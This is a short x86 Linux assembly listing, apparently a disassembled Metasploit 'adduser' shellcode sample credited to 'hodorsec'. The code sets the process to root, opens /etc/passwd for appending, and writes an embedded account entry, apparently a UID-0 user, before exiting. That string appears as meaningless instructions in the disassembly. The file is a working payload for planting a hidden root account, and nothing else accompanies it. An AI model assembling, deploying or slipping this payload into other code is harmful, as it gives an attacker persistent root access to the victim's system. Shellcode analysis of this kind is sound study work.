; Name; msf_linx86_adduser_asm_sample1.asm
; Author hodorsec

global _start
section .text

_start:

xor ecx,ecx
mov ebx,ecx
push byte +0x46
pop eax
int 0x80

push byte +0x5
pop eax
xor ecx,ecx
push ecx
push dword 0x64777373
push dword 0x61702f2f
push dword 0x6374652f
mov ebx,esp
inc ecx
mov ch,0x4
int 0x80

xchg eax,ebx
call dword 0x4e
push dword 0x726f646f
cmp al,[ecx+0x7a]
insd
jnz 0x90
jc 0xa7
jnc 0x7c
push byte +0x52
pop ecx
push ebp
cmp dh,[eax]
cmp dh,[eax]
cmp bh,[edx]
das
cmp ch,[edi]
bound ebp,[ecx+0x6e]
das
jnc 0xb5
or bl,[ecx-0x75]
push ecx
cld
push byte +0x4
pop eax
int 0x80

push byte +0x1
pop eax
int 0x80

